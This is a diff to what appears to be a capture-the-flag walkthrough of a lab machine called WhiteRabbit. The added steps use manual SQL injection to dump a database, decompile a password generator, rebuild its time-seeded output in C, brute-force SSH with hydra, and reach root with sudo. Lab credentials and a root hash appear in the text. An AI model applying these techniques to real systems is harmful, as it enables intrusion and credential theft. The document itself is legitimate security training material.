@@ -166,6 +166,13 @@ By search `hmac` from the example json file, we can find that
 Then we successfully get the `secret` here.
 `3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS`
 
+![](images/Pasted%20image%2020250409224918.png)
+By checking the sql query, we can find the basic sql-injection here.
+![](images/Pasted%20image%2020250409230252.png)
+The valid request here is working well
+When we add some `"` into the query, the debug message of database would give us.
+![](images/Pasted%20image%2020250409230354.png)
+
 Let's make a script to help us to check the sql-injection here.
 ```
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -331,6 +338,30 @@ sqlmap -r sqlmap.req --proxy=http://127.0.0.1:8000 --batch --level=5 --risk=3 --
 ```
 Then you can get dump of database.
 We can get something interesting from table `command_log`
+`uname -a、restic init、echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd`
+
+In this place, I would check the sql injection munally here
+Firstly let's check schema name
+![](images/Pasted%20image%2020250409230815.png)
+Then we can successfully get the database name  `information_schema,phishing,temp`
+![](images/Pasted%20image%2020250409230920.png)
+Then let's try to dump all the databases
+![](images/Pasted%20image%2020250409231129.png)
+![](images/Pasted%20image%2020250409231236.png)
+Then we can know there is a table `victims`with 2 columns `email,phishing_score`
+That seems not like our target here, so let's try to check the other database `temp` here.
+![](images/Pasted%20image%2020250409231422.png)
+![](images/Pasted%20image%2020250409231543.png)
+Then we can know there is a table `command_log` with 2 columns `id,command,date`, let's try to leak the data from this table.
+![](images/Pasted%20image%2020250409231720.png)
+![](images/Pasted%20image%2020250409231908.png)
+![](images/Pasted%20image%2020250409232012.png)
+![](images/Pasted%20image%2020250409232051.png)
+![](images/Pasted%20image%2020250409232129.png)
+![](images/Pasted%20image%2020250409232200.png)
+By combining them, then we can get the what we want to get
+`uname -a、restic init、echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd`
+
 we find two important commands here, a restic subdomain `75951e6ff.whiterabbit.htb` with password, and a hint for a password generator
 ```
 ❯ echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
@@ -447,9 +478,118 @@ f0mHXv2ZJNGTduO5q37N
 ```
 It seems like a password of user `neo`, but I try to use it to login, but it did not work.
 
-So I think I have to Decompile this binary file
-(PS: I don't know how to reverse engineer, so this place, I will just put the valid pasword here)
-`WBSxhWgfnMiclrV4dqfj`
+So I think I have to Decompile this binary file, in this I would like use `Ghidra`, `IDA pro` would be fun if you know how to use that.
+![](images/Pasted%20image%2020250409232508.png)
+```
+undefined8 main(void)
+
+{
+  long in_FS_OFFSET;
+  timeval local_28;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  gettimeofday(&local_28,(__timezone_ptr_t)0x0);
+  generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return 0;
+}
+
+```
+We can also change these pseudocode into C code
+```
+int main(void) {
+    // Stack Canary 读取
+    long stack_canary_saved = __stack_chk_guard;
+    
+    // 获取当前时间
+    struct timeval t;
+    gettimeofday(&t, NULL);
+    long millis = t.tv_sec * 1000 + t.tv_usec / 1000;
+    
+    // 生成密码
+    generate_password(millis);
+    
+    // 堆栈保护检查
+    if (stack_canary_saved != __stack_chk_guard) {
+        __stack_chk_fail();
+    }
+    return 0;
+}
+
+```
+The main function of this code is to generate a password or passphrase based on the current time (millisecond level), in conjunction with the compiler's built-in stack protection mechanism.
+
+From the database, we know that running the command `cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd to change the password is at 2024-08-30 14:40:42`. From the path we can also tell that this is user `neo`.
+
+Next, let's try to write a complete password generator
+```
+#include <stdio.h>
+#include <stdlib.h>
+
+void generate_password(unsigned int seed) {
+    // 1) 使用21字节缓冲：20个随机字符 + '\0'
+    char password[21];
+    const char *charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
+    // 用传入的种子调用 srand
+    srand(seed);
+
+    // 2) 循环生成20个随机字符
+    for (int i = 0; i < 20; i++) {
+        int random_value = rand();
+        password[i] = charset[random_value % 62];
+    }
+
+    // 3) 手动添加字符串终止符
+    password[20] = '\0';
+
+    // 打印结果
+    printf("%s\n", password);
+}
+
+int main(void) {
+    // 如果要确保乘法不溢出，可以使用 long long 或 unsigned long long
+    // 这里演示使用 long long 进行计算，然后只取低32位给 srand()
+    for (int add = 0; add <= 1000; add++) {
+        long long fullSeed = (long long)1725028842 * 1000LL + add;
+        // 仅将计算结果的低32位作为种子
+        generate_password((unsigned int)(fullSeed));
+    }
+    return 0;
+}
+```
+Then let's save them into a file and use hydra to crack the password of neo by using ssh.
+```
+hydra -l neo -P neo_password.txt ssh://10.10.11.63 -I
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-09 23:36:57
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 1001 login tries (l:1/p:1001), ~63 tries per task
+[DATA] attacking ssh://10.10.11.63:22/
+[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-09 23:37:06
+```
+Then we finally get the password of `neo` `neo:WBSxhWgfnMiclrV4dqfj`
+Let's try to ssh to this user.
+We can check `sudo -l`
+```
+neo@whiterabbit:~$ sudo -l
+[sudo] password for neo: 
+Matching Defaults entries for neo on whiterabbit:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User neo may run the following commands on whiterabbit:
+
+```
+We can just `sudo su` with the password of `neo` and get the root shell.
 
 
-Root hash `root:$y$j9T$Rx7IRKAooZBFEEKqpflWl1$fK0BeVoPRj.EwPj9sYKZMu.Ti0EmrFpmQQZmayCKdL/:19962:0:99999:7:::`
+
+Root hash
+`root:$y$j9T$Rx7IRKAooZBFEEKqpflWl1$fK0BeVoPRj.EwPj9sYKZMu.Ti0EmrFpmQQZmayCKdL/:19962:0:99999:7:::`
